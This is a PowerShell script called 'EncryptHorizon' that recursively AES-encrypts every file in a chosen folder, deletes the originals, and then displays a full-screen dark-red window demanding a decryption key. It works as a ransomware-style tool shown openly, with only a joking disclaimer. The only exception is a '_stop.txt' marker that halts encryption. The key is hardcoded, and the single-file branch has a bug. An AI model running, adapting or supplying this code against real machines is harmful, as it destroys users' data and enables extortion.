# ███████╗███╗   ██╗ ██████╗██████╗ ██╗   ██╗██████╗ ████████╗██╗  ██╗ ██████╗ ██████╗ ██╗███████╗ ██████╗ ███╗   ██╗    ██╗   ██╗ ██╗   ██╗
# ██╔════╝████╗  ██║██╔════╝██╔══██╗╚██╗ ██╔╝██╔══██╗╚══██╔══╝██║  ██║██╔═══██╗██╔══██╗██║╚══███╔╝██╔═══██╗████╗  ██║    ██║   ██║███║  ███║
# █████╗  ██╔██╗ ██║██║     ██████╔╝ ╚████╔╝ ██████╔╝   ██║   ███████║██║   ██║██████╔╝██║  ███╔╝ ██║   ██║██╔██╗ ██║    ██║   ██║╚██║  ╚██║
# ██╔══╝  ██║╚██╗██║██║     ██╔══██╗  ╚██╔╝  ██╔═══╝    ██║   ██╔══██║██║   ██║██╔══██╗██║ ███╔╝  ██║   ██║██║╚██╗██║    ╚██╗ ██╔╝ ██║   ██║
# ███████╗██║ ╚████║╚██████╗██║  ██║   ██║   ██║        ██║   ██║  ██║╚██████╔╝██║  ██║██║███████╗╚██████╔╝██║ ╚████║     ╚████╔╝  ██║██╗██║
# ╚══════╝╚═╝  ╚═══╝ ╚═════╝╚═╝  ╚═╝   ╚═╝   ╚═╝        ╚═╝   ╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═╝╚═╝╚══════╝ ╚═════╝ ╚═╝  ╚═══╝      ╚═══╝   ╚═╝╚═╝╚═╝
# Author: @maxbirnbacher
# Date: 2023-10-09
# Version: 1.1

# This script is modifying the Invoke-AESEncryption function from DRTools
# It is intended to encrypt any file or folder that is specified in the input
# If the script finds a file that is matching a specific name, it will not be encrypted
# Everything else will be encrypted. Muhahahaha!!!! (do not use this script for evil purposes (there are probably better tools out there) ;-) )

# Usage:
# Load the script in PowerShell and use the EncryptHorizon function
# . .\EncryptHorizon.ps1

# Now you can use the EncryptHorizon function
# EncryptHorizon -action <Encrypt|Decrypt> [-path <path>]


# Install the DRTools module from the PowerShell Gallery if not already installed
if (-not (Get-Module -ListAvailable -Name DRTools)) {
    Install-Module -Name DRTools -Scope CurrentUser -Force
}

# Import the DRTools module
Import-Module DRTools

# Define the special file (red flag)
$redFlagFile = "_stop.txt"

# Function to encrypt or decrypt a single file
function EncryptOrDecryptFile($filePath, $action, $key) {
    # Check if the file exists
    if (Test-Path $filePath -PathType Leaf) {
        if ($action -eq "Encrypt") {
            #check if the file is the red flag file (or if the path contains the red flag at any point) and skip it
            if ($filePath -like "*$redFlagFile*") {
                Write-Host "Skipping $redFlagFile"
                return
            } else {
                Write-Host "Encrypting $filePath"
                # Perform encryption and delete the original file
                Invoke-AESEncryption -Path $filePath -Mode Encrypt -Key $key
                Remove-Item $filePath -Force
            }
        } elseif ($action -eq "Decrypt") {
            if ($filePath -like "*.aes") {
                Write-Host "Decrypting $filePath"
                # Perform decryption and delete the encrypted file
                Invoke-AESEncryption -Path $filePath -Mode Decrypt -Key $key
                Remove-Item $filePath -Force
            }
        }
    }
}

# Function to recursively encrypt or decrypt files in a folder
function EncryptOrDecryptFolder($folderPath, $action, $key) {
    # Check if the folder exists
    if (Test-Path $folderPath -PathType Container) {
        # Get all files in the folder
        $files = Get-ChildItem $folderPath -File

        # Process each file
        foreach ($file in $files) {
            # Check if the file is the red flag file and abort the encryption process if it is
            if ($file.Name -eq $redFlagFile) {
                Write-Host "Aborting encryption process. Found $redFlagFile"
                return
            } else {
                # Encrypt or decrypt the file
                EncryptOrDecryptFile $file.FullName $action $key
            }
        }

        # Recursively process subfolders
        $subfolders = Get-ChildItem $folderPath -Directory
        foreach ($subfolder in $subfolders) {
            EncryptOrDecryptFolder $subfolder.FullName $action $key
        }
    }
}

# Function to use the script as a command
function EncryptHorizon {
    [CmdletBinding()]
    param (
        [Parameter(Mandatory = $true)]
        [ValidateSet("Encrypt", "Decrypt")]
        [string]$action,
        [Parameter(Mandatory = $true)]
        [string]$path,
        [Parameter(Mandatory = $false)]
        [string]$key = "MTIzNDU2Nzg5MDEyMzQ1Njc4OTAxMjM0NTY3ODkwMTI="
    )

    # Check if the path is a file or folder
    if (Test-Path $path -PathType Leaf) {
        # check if a key was provided
        if ($key -eq "") {
            # Encrypt or decrypt the file
            EncryptOrDecryptFile $path $action $key
        }
        
    } elseif (Test-Path $path -PathType Container) {
        # Encrypt or decrypt the folder
        EncryptOrDecryptFolder $path $action $key
    } else {
        Write-Host "The specified path does not exist"
    }

    # Decryption Dialog
    if ($action -eq "Encrypt") {
        # Create a new form
        Add-Type -AssemblyName System.Windows.Forms
        $form = New-Object System.Windows.Forms.Form
        $form.FormBorderStyle = [System.Windows.Forms.FormBorderStyle]::None
        $form.WindowState = [System.Windows.Forms.FormWindowState]::Maximized
        $form.BackColor = [System.Drawing.Color]::DarkRed
        $form.StartPosition = [System.Windows.Forms.FormStartPosition]::CenterScreen

        # Create a label to display the message
        $messageLabel = New-Object System.Windows.Forms.Label
        $messageLabel.Text = "EncryptHorizon v1.1`nPlease enter the decryption key:"
        $messageLabel.Font = New-Object System.Drawing.Font("Arial", 24, [System.Drawing.FontStyle]::Bold)
        $messageLabel.ForeColor = [System.Drawing.Color]::White
        $messageLabel.AutoSize = $true
        $messageLabel.Location = New-Object System.Drawing.Point(10, 10)

        # Create a text box for the key input
        $keyTextBox = New-Object System.Windows.Forms.TextBox
        $keyTextBox.Font = New-Object System.Drawing.Font("Arial", 24, [System.Drawing.FontStyle]::Bold)
        $keyTextBox.Width = $form.ClientSize.Width + 200
        $keyTextBox.Height = 50

        # Calculate the center point of the form
        $posYbelowMessage = $messageLabel.Location.Y + $messageLabel.Height + 70

        # Adjust the location of the text box
        $keyTextBox.Location = New-Object System.Drawing.Point(10, $posYbelowMessage)

        #  Calculate the center point of the form
        $posYbelowTextBox = $keyTextBox.Location.Y + $keyTextBox.Height + 20

        # add a button to the form to decrypt the files
        $decryptButton = New-Object System.Windows.Forms.Button
        $decryptButton.Text = "Decrypt"
        $decryptButton.Font = New-Object System.Drawing.Font("Arial", 24, [System.Drawing.FontStyle]::Bold)
        $decryptButton.ForeColor = [System.Drawing.Color]::White
        $decryptButton.Width = $form.ClientSize.Width - 20
        $decryptButton.Height = 50
        $decryptButton.Location = New-Object System.Drawing.Point(10, $posYbelowTextBox)

        $decryptButton.Add_Click({
            # Get the key from the text box
            $key = $keyTextBox.Text
            # Decrypt all files in the folder and subfolders with the user-provided key
            EncryptOrDecryptFolder $path "Decrypt" $key
            $form.Close()
        })
        
        # Add the controls to the form
        $form.Controls.Add($messageLabel)
        $form.Controls.Add($keyTextBox)
        $form.Controls.Add($decryptButton)

        # Show the form and wait for the user to enter the key
        $result = $form.ShowDialog()

        # Dispose of the form
        $form.Dispose()
    }
}
